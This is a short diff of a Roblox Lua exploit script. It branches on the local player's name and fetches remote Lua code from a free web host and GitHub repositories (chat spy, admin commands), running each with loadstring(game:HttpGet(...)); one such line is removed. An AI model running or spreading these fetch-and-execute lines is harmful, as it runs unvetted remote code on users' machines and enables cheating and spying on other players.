@@ -3,7 +3,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/dehoisted/Chat-Spy/ma
 if game.Players.LocalPlayer.Name == Settings.Main then
     wait(5)
     loadstring(game:HttpGet("https://unset-order.000webhostapp.com/scripts/DaHood.lua"))();
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 else
     loadstring(game:HttpGet("https://unset-order.000webhostapp.com/scripts/summon.lua"))();
     loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
